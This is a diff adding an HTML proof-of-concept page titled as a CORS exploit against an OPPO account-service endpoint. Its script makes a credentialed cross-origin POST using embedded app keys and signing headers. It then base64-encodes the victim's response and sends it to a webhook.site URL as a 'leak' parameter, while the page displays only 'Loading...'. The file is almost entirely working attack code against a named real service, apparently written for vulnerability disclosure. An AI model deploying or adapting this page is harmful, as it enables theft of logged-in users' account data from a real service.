@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Exploit PoC - OPPO</title>
+</head>
+<body>
+  <h1>Loading...</h1>
+  <script>
+    fetch("https://id-in.oppo.com/completion/v1/validate-and-save", {
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json;charset=UTF-8",
+        "X-App-Traceid": "PoC123456789",
+        "X-App-Acappkey": "CuGsbe6HdAe6vDBHFew2Di",
+        "X-Device-Brand": "OPPO",
+        "X-Device-Clienttype": "WEB",
+        "X-Web-Client-Type": "pc",
+        "X-App-Overseaclient": "true",
+        "X-Biz-Appkey": "GhGxduZv6HCk5wnyZ34P4G",
+        "X-App-Deviceid": "exploit-device-id",
+        "X-Timezone": "GMT+5.5",
+        "X-Envelope-Version": "V1",
+        "X-Sign-Key": "4iAEb620alQ8s8c8ss8o0K8sS",
+        "X-Sign": "test-payload-signature",
+        "X-Requesttime": Date.now().toString()
+      },
+      body: JSON.stringify("testing")
+    })
+    .then(res => res.text())
+    .then(data => {
+      fetch("https://webhook.site/554478c6-3aaf-4a07-8c60-f34aaec1f0ef?leak=" + btoa(data));
+    })
+    .catch(err => {
+      console.error("Exploit failed:", err);
+    });
+  </script>
+</body>
+</html>
+
